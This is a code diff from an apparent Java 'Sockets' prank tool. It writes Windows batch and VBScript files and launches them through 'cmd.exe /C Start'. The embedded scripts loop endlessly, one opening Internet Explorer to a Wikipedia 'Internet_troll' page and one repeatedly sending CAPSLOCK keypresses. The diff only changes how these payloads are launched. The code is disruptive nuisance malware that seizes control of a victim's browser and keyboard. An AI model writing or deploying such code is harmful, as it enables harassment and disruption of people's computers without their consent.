@@ -102,8 +102,8 @@ class Sockets
 "start iexplore en.wikipedia.org/wiki/Internet_troll" + nl +
 "goto:A");
                 bw.close();
-
-                System.out.println(Sockets.executeCommand(new String[]{"start", filePath}));
+                
+                System.out.println(Sockets.executeCommand(new String[]{"cmd.exe", "/C", "Start", filePath}));
                 System.out.println("IExplorer Prank!");
                 
             }else if(random <= 6)
@@ -121,8 +121,8 @@ class Sockets
 "wshshell.sendkeys “{CAPSLOCK}”" + nl +
 "loop");
                 bw.close();
-
-                System.out.println(Sockets.executeCommand(new String[]{"start", filePath}));
+                    
+                System.out.println(Sockets.executeCommand(new String[]{"cmd.exe", "/C", "Start", filePath}));
                 System.out.println("Capslock Prank!");
                 
             }else
